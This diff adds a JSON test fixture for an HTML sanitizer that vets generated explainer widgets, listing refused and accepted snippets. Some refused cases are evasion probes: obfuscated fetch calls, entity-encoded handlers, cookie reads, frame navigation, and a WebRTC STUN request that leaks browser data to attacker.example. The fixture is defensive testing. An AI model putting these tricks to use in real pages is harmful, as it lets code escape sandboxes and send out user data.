@@ -1,0 +1,583 @@
+{
+  "schemaVersion": 1,
+  "values": {
+    "fallLowFeet": 10.0,
+    "fallHighFeet": 15.0
+  },
+  "refused": [
+    {
+      "name": "doctype",
+      "rule": "MARKUP",
+      "html": "<!doctype html><p>Water</p>"
+    },
+    {
+      "name": "html comment",
+      "rule": "MARKUP",
+      "html": "<p>Water</p><!-- note -->"
+    },
+    {
+      "name": "comment opener inside a script",
+      "rule": "MARKUP",
+      "html": "<script><!--\nconst a = 1;\n--></script>"
+    },
+    {
+      "name": "CDATA section",
+      "rule": "MARKUP",
+      "html": "<svg><![CDATA[x]]></svg>"
+    },
+    {
+      "name": "processing instruction",
+      "rule": "MARKUP",
+      "html": "<?xml-stylesheet href=\"#a\"?><p>Water</p>"
+    },
+    {
+      "name": "module script",
+      "rule": "MARKUP",
+      "html": "<script type=\"module\">const a = 1;</script>"
+    },
+    {
+      "name": "script with a source",
+      "rule": "MARKUP",
+      "html": "<script src=\"#a\"></script>"
+    },
+    {
+      "name": "element shadowing the data element",
+      "rule": "MARKUP",
+      "html": "<div id=\"kv-data\"></div>"
+    },
+    {
+      "name": "style inside svg",
+      "rule": "MARKUP",
+      "html": "<svg><style>circle{fill:red}</style></svg>"
+    },
+    {
+      "name": "script inside svg",
+      "rule": "MARKUP",
+      "html": "<svg><script>const a = 1;</script></svg>"
+    },
+    {
+      "name": "self-closing script",
+      "rule": "MARKUP",
+      "html": "<p>Water</p><script/>const a = 1;</script>"
+    },
+    {
+      "name": "self-closing script with a space",
+      "rule": "MARKUP",
+      "html": "<script />const a = 1;</script>"
+    },
+    {
+      "name": "self-closing style",
+      "rule": "MARKUP",
+      "html": "<style/>p{color:red}</style>"
+    },
+    {
+      "name": "meta refresh",
+      "rule": "ELEMENT",
+      "html": "<meta http-equiv=\"refresh\" content=\"0;url=#a\">"
+    },
+    {
+      "name": "base",
+      "rule": "ELEMENT",
+      "html": "<base href=\"#a\">"
+    },
+    {
+      "name": "stylesheet link",
+      "rule": "ELEMENT",
+      "html": "<link rel=\"stylesheet\" href=\"#a\">"
+    },
+    {
+      "name": "form",
+      "rule": "ELEMENT",
+      "html": "<form><button type=\"submit\">Send</button></form>"
+    },
+    {
+      "name": "object",
+      "rule": "ELEMENT",
+      "html": "<object></object>"
+    },
+    {
+      "name": "embed",
+      "rule": "ELEMENT",
+      "html": "<embed>"
+    },
+    {
+      "name": "nested iframe",
+      "rule": "ELEMENT",
+      "html": "<iframe></iframe>"
+    },
+    {
+      "name": "frameset",
+      "rule": "ELEMENT",
+      "html": "<frameset></frameset>"
+    },
+    {
+      "name": "textarea",
+      "rule": "ELEMENT",
+      "html": "<textarea>Water</textarea>"
+    },
+    {
+      "name": "title",
+      "rule": "ELEMENT",
+      "html": "<svg><title>Water</title></svg>"
+    },
+    {
+      "name": "noscript",
+      "rule": "ELEMENT",
+      "html": "<noscript>Water</noscript>"
+    },
+    {
+      "name": "video",
+      "rule": "ELEMENT",
+      "html": "<video></video>"
+    },
+    {
+      "name": "mathml",
+      "rule": "ELEMENT",
+      "html": "<math><mi>x</mi></math>"
+    },
+    {
+      "name": "iframe built by a script",
+      "rule": "ELEMENT",
+      "html": "<script>document.createElement(\"iframe\");</script>"
+    },
+    {
+      "name": "script built by a script",
+      "rule": "ELEMENT",
+      "html": "<script>document.createElement('script');</script>"
+    },
+    {
+      "name": "iframe markup in a script string",
+      "rule": "ELEMENT",
+      "html": "<script>const s = \"<iframe>\";</script>"
+    },
+    {
+      "name": "fetch",
+      "rule": "API",
+      "html": "<script>fetch(\"#a\");</script>"
+    },
+    {
+      "name": "XMLHttpRequest",
+      "rule": "API",
+      "html": "<script>new XMLHttpRequest();</script>"
+    },
+    {
+      "name": "WebSocket",
+      "rule": "API",
+      "html": "<script>const s = new WebSocket(address);</script>"
+    },
+    {
+      "name": "EventSource",
+      "rule": "API",
+      "html": "<script>new EventSource(address);</script>"
+    },
+    {
+      "name": "sendBeacon",
+      "rule": "API",
+      "html": "<script>navigator.sendBeacon(address, body);</script>"
+    },
+    {
+      "name": "dynamic import",
+      "rule": "API",
+      "html": "<script>import(address);</script>"
+    },
+    {
+      "name": "eval",
+      "rule": "API",
+      "html": "<script>eval(code);</script>"
+    },
+    {
+      "name": "Function",
+      "rule": "API",
+      "html": "<script>Function(code)();</script>"
+    },
+    {
+      "name": "constructor of a function",
+      "rule": "API",
+      "html": "<script>[].map.constructor(code)();</script>"
+    },
+    {
+      "name": "Worker",
+      "rule": "API",
+      "html": "<script>new Worker(address);</script>"
+    },
+    {
+      "name": "SharedWorker",
+      "rule": "API",
+      "html": "<script>new SharedWorker(address);</script>"
+    },
+    {
+      "name": "importScripts",
+      "rule": "API",
+      "html": "<script>importScripts(address);</script>"
+    },
+    {
+      "name": "window.open",
+      "rule": "API",
+      "html": "<script>window.open(address);</script>"
+    },
+    {
+      "name": "document.cookie",
+      "rule": "API",
+      "html": "<script>const c = document.cookie;</script>"
+    },
+    {
+      "name": "localStorage",
+      "rule": "API",
+      "html": "<script>localStorage.setItem(key, value);</script>"
+    },
+    {
+      "name": "sessionStorage",
+      "rule": "API",
+      "html": "<script>sessionStorage.clear();</script>"
+    },
+    {
+      "name": "indexedDB",
+      "rule": "API",
+      "html": "<script>indexedDB.open(name);</script>"
+    },
+    {
+      "name": "postMessage to the parent",
+      "rule": "API",
+      "html": "<script>parent.postMessage(value, origin);</script>"
+    },
+    {
+      "name": "top navigation",
+      "rule": "API",
+      "html": "<script>top.location = address;</script>"
+    },
+    {
+      "name": "parent navigation",
+      "rule": "API",
+      "html": "<script>window.parent.location.href = address;</script>"
+    },
+    {
+      "name": "own navigation",
+      "rule": "API",
+      "html": "<script>location.assign(address);</script>"
+    },
+    {
+      "name": "global read by a computed name",
+      "rule": "API",
+      "html": "<script>window[\"fe\" + \"tch\"](address);</script>"
+    },
+    {
+      "name": "timer given a string",
+      "rule": "API",
+      "html": "<script>setTimeout(\"draw()\", 0);</script>"
+    },
+    {
+      "name": "markup written into the page",
+      "rule": "API",
+      "html": "<script>document.body.innerHTML = markup;</script>"
+    },
+    {
+      "name": "document.write",
+      "rule": "API",
+      "html": "<script>document.write(markup);</script>"
+    },
+    {
+      "name": "Reflect",
+      "rule": "API",
+      "html": "<script>Reflect.get(window, name);</script>"
+    },
+    {
+      "name": "peer connection",
+      "rule": "API",
+      "html": "<script>new RTCPeerConnection(settings);</script>"
+    },
+    {
+      "name": "fetch spelled with a unicode escape",
+      "rule": "API",
+      "html": "<script>\\u0066etch(address);</script>"
+    },
+    {
+      "name": "navigation through an alias",
+      "rule": "API",
+      "html": "<script>const w = window; w.location = address;</script>"
+    },
+    {
+      "name": "navigation of the parent through this",
+      "rule": "API",
+      "html": "<script>this.parent.focus();</script>"
+    },
+    {
+      "name": "event handler attribute",
+      "rule": "API",
+      "html": "<button type=\"button\" onclick=\"fetch(address)\">Go</button>"
+    },
+    {
+      "name": "entity-encoded handler",
+      "rule": "API",
+      "html": "<img src=\"data:image/png;base64,AAAA\" alt=\"Water\" onerror=\"&#102;etch(address)\">"
+    },
+    {
+      "name": "peer connection through a descriptor of window",
+      "rule": "API",
+      "html": "<script>const d = Object.getOwnPropertyDescriptor(window, 'RTC' + 'PeerConnection'); const pc = new d.value({ iceServers: [{ urls: 'st' + 'un:' + navigator.language + '.attacker.example' }] }); pc.createDataChannel('a'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });</script>"
+    },
+    {
+      "name": "parent through a descriptor of window",
+      "rule": "API",
+      "html": "<script>const p = Object.getOwnPropertyDescriptor(window, 'par' + 'ent');</script>"
+    },
+    {
+      "name": "property names of the global",
+      "rule": "API",
+      "html": "<script>const names = Object.getOwnPropertyNames(globalThis);</script>"
+    },
+    {
+      "name": "window handed on as a value",
+      "rule": "API",
+      "html": "<script>const w = window; w.name = 'a';</script>"
+    },
+    {
+      "name": "this at the top as a value",
+      "rule": "API",
+      "html": "<script>const g = (function () { return this; })();</script>"
+    },
+    {
+      "name": "the window of an event",
+      "rule": "API",
+      "html": "<button type=\"button\" onclick=\"const w = event.view; w.name = 'a'\">Go</button>"
+    },
+    {
+      "name": "the document's window",
+      "rule": "API",
+      "html": "<script>document.defaultView.name = 'a';</script>"
+    },
+    {
+      "name": "a nested frame's window",
+      "rule": "API",
+      "html": "<script>const w = document.getElementById('a').contentWindow;</script>"
+    },
+    {
+      "name": "external image",
+      "rule": "URL",
+      "html": "<img src=\"https://example.org/a.png\" alt=\"Water\">"
+    },
+    {
+      "name": "protocol-relative image",
+      "rule": "URL",
+      "html": "<img src=\"//example.org/a.png\" alt=\"Water\">"
+    },
+    {
+      "name": "relative image",
+      "rule": "URL",
+      "html": "<img src=\"a.png\" alt=\"Water\">"
+    },
+    {
+      "name": "javascript link",
+      "rule": "URL",
+      "html": "<a href=\"javascript:void(0)\">Go</a>"
+    },
+    {
+      "name": "html data link",
+      "rule": "URL",
+      "html": "<a href=\"data:text/html,x\">Go</a>"
+    },
+    {
+      "name": "external css url",
+      "rule": "URL",
+      "html": "<style>p{background:url(https://example.org/a.png)}</style>"
+    },
+    {
+      "name": "relative css url",
+      "rule": "URL",
+      "html": "<style>p{background:url(a.png)}</style>"
+    },
+    {
+      "name": "css import",
+      "rule": "URL",
+      "html": "<style>@import \"a.css\";</style>"
+    },
+    {
+      "name": "css image-set",
+      "rule": "URL",
+      "html": "<style>p{background:image-set(\"a.png\" 1x)}</style>"
+    },
+    {
+      "name": "style attribute url",
+      "rule": "URL",
+      "html": "<p style=\"background:url('//example.org/a')\">Water</p>"
+    },
+    {
+      "name": "srcset",
+      "rule": "URL",
+      "html": "<img srcset=\"a.png 2x\" alt=\"Water\">"
+    },
+    {
+      "name": "external svg use",
+      "rule": "URL",
+      "html": "<svg><use href=\"https://example.org/s.svg#a\"></use></svg>"
+    },
+    {
+      "name": "animated href",
+      "rule": "URL",
+      "html": "<svg><a><animate attributeName=\"href\" to=\"#a\"></animate></a></svg>"
+    },
+    {
+      "name": "foreign namespace",
+      "rule": "URL",
+      "html": "<svg xmlns=\"https://example.org/ns\"></svg>"
+    },
+    {
+      "name": "ping",
+      "rule": "URL",
+      "html": "<a href=\"#a\" ping=\"https://example.org/p\">Go</a>"
+    },
+    {
+      "name": "formaction",
+      "rule": "URL",
+      "html": "<button type=\"button\" formaction=\"https://example.org/f\">Go</button>"
+    },
+    {
+      "name": "address in a script",
+      "rule": "URL",
+      "html": "<script>const address = \"https://example.org/x\";</script>"
+    },
+    {
+      "name": "a stun server in a string",
+      "rule": "URL",
+      "html": "<script>const ice = { urls: 'stun:relay.example.org' };</script>"
+    },
+    {
+      "name": "a turn server in a string",
+      "rule": "URL",
+      "html": "<script>const ice = { urls: 'turns:relay.example.org' };</script>"
+    },
+    {
+      "name": "an unclosed css url",
+      "rule": "URL",
+      "html": "<p style=\"background:url(&quot;//example.org/a.png)\">Water</p>"
+    },
+    {
+      "name": "invented figure in text",
+      "rule": "NUMBER",
+      "html": "<p>The water falls 12 feet a year.</p>"
+    },
+    {
+      "name": "invented figure in a label",
+      "rule": "NUMBER",
+      "html": "<p aria-label=\"For 450 years\">Water</p>"
+    },
+    {
+      "name": "invented figure in css content",
+      "rule": "NUMBER",
+      "html": "<style>p::after{content:\"450 years\"}</style>"
+    },
+    {
+      "name": "invented constant in code",
+      "rule": "NUMBER",
+      "html": "<script>const depth = 37;</script>"
+    },
+    {
+      "name": "invented figure in a code string",
+      "rule": "NUMBER",
+      "html": "<script>const said = \"fell 37 feet\";</script>"
+    },
+    {
+      "name": "hexadecimal literal",
+      "rule": "NUMBER",
+      "html": "<script>const a = 0x1F;</script>"
+    },
+    {
+      "name": "exponent literal",
+      "rule": "NUMBER",
+      "html": "<script>const a = 4.5e2;</script>"
+    },
+    {
+      "name": "big integer literal",
+      "rule": "NUMBER",
+      "html": "<script>const a = 450n;</script>"
+    },
+    {
+      "name": "separated literal",
+      "rule": "NUMBER",
+      "html": "<script>const a = 1_000;</script>"
+    },
+    {
+      "name": "invented slider bound",
+      "rule": "NUMBER",
+      "html": "<input type=\"range\" min=\"0\" max=\"450\" aria-label=\"Years\">"
+    },
+    {
+      "name": "invented data attribute",
+      "rule": "NUMBER",
+      "html": "<p data-years=\"450\">Water</p>"
+    },
+    {
+      "name": "a figure against its unit",
+      "rule": "NUMBER",
+      "html": "<p>The river runs 500km to the sea.</p>"
+    },
+    {
+      "name": "an ordinal century",
+      "rule": "NUMBER",
+      "html": "<p>Since the 18th century.</p>"
+    },
+    {
+      "name": "a year against its era",
+      "rule": "NUMBER",
+      "html": "<p>Dyed in 1868AD.</p>"
+    },
+    {
+      "name": "a year glued to capitals",
+      "rule": "NUMBER",
+      "html": "<p>Dyed in AD1868.</p>"
+    },
+    {
+      "name": "a figure against its unit in a label",
+      "rule": "NUMBER",
+      "html": "<p aria-label=\"500km\">Water</p>"
+    },
+    {
+      "name": "a figure against its unit in a script string",
+      "rule": "NUMBER",
+      "html": "<script>const t = \"500km\";</script>"
+    },
+    {
+      "name": "a list numbered from a year",
+      "rule": "NUMBER",
+      "html": "<ol start=\"1868\"><li>Water</li></ol>"
+    },
+    {
+      "name": "a counter set to a year",
+      "rule": "NUMBER",
+      "html": "<style>p::before{content:counter(y)}</style><p style=\"counter-reset:y 1868\">Water</p>"
+    }
+  ],
+  "accepted": [
+    {
+      "name": "the fixture's generated explainer",
+      "html": "<style>\n.kv{display:grid;gap:12px;padding:16px;font:15px/1.5 system-ui,sans-serif;color:#1d1b16;background:#faf7f0}\n.kv label{display:grid;grid-template-columns:minmax(0,1fr) auto;gap:8px;align-items:center}\n.kv input{width:100%}\n.kv .bar{height:16px;border-radius:8px;background:#e4dccb;overflow:hidden}\n.kv .fill{height:100%;width:0;background:#2f5d8a;transition:width .3s ease}\n.kv .fill.high{background:#8a3b2f}\n</style>\n<div class=\"kv\">\n<label for=\"years\">Years from now <output id=\"count\"></output></label>\n<input id=\"years\" type=\"range\" min=\"1\" max=\"10\" step=\"1\" value=\"1\">\n<div class=\"bar\" role=\"img\" aria-label=\"Fall at the lower stated rate\"><div class=\"fill\" id=\"low\"></div></div>\n<div class=\"bar\" role=\"img\" aria-label=\"Fall at the higher stated rate\"><div class=\"fill high\" id=\"high\"></div></div>\n<p id=\"said\" aria-live=\"polite\"></p>\n</div>\n<script>\nconst data = JSON.parse(document.getElementById(\"kv-data\").textContent);\nconst years = document.getElementById(\"years\");\nfunction draw() {\n  const n = Number(years.value);\n  const most = Number(years.max) * data.fallHighFeet;\n  document.getElementById(\"count\").textContent = String(n);\n  document.getElementById(\"low\").style.width = (n * data.fallLowFeet / most * 100) + \"%\";\n  document.getElementById(\"high\").style.width = (n * data.fallHighFeet / most * 100) + \"%\";\n  document.getElementById(\"said\").textContent = \"The water table is \" + n * data.fallLowFeet + \" to \" + n * data.fallHighFeet + \" feet lower.\";\n}\nyears.addEventListener(\"input\", draw);\ndraw();\n</script>"
+    },
+    {
+      "name": "svg geometry with a gradient fragment",
+      "html": "<svg viewBox=\"0 0 320 120\" role=\"img\" aria-label=\"Water table\"><defs><linearGradient id=\"g\"><stop offset=\"0\" stop-color=\"#2f5d8a\"></stop></linearGradient></defs><rect x=\"8\" y=\"8\" width=\"304\" height=\"40\" fill=\"url(#g)\"></rect><circle cx=\"160\" cy=\"80\" r=\"12\"></circle></svg>"
+    },
+    {
+      "name": "inline data image",
+      "html": "<img src=\"data:image/png;base64,iVBORw0KGgo=\" alt=\"Water level\">"
+    },
+    {
+      "name": "svg namespace declared",
+      "html": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 10 10\"><path d=\"M0 0L10 10\"></path></svg>"
+    },
+    {
+      "name": "svg built by a script",
+      "html": "<svg id=\"c\" viewBox=\"0 0 100 100\"></svg><script>const ns = \"http://www.w3.org/2000/svg\";const dot = document.createElementNS(ns, \"circle\");dot.setAttribute(\"r\", \"4\");document.getElementById(\"c\").append(dot);</script>"
+    },
+    {
+      "name": "data figures shown",
+      "html": "<p>Up to <strong>15</strong> feet, at least <strong>10</strong>.</p>"
+    },
+    {
+      "name": "button moving a marker",
+      "html": "<div id=\"m\" style=\"position:absolute;top:0\"></div><button type=\"button\" onclick=\"document.getElementById('m').style.top = '24px'\">Move</button>"
+    },
+    {
+      "name": "animation from layout constants",
+      "html": "<canvas id=\"c\" aria-label=\"Water falling\"></canvas><script>const canvas = document.getElementById(\"c\");const ctx = canvas.getContext(\"2d\");let t = 0;function frame() { t = (t + 1) % 360; ctx.clearRect(0, 0, canvas.width, canvas.height); ctx.fillRect(0, 0, canvas.width * t / 360, 8); requestAnimationFrame(frame); }requestAnimationFrame(frame);</script>"
+    }
+  ]
+}
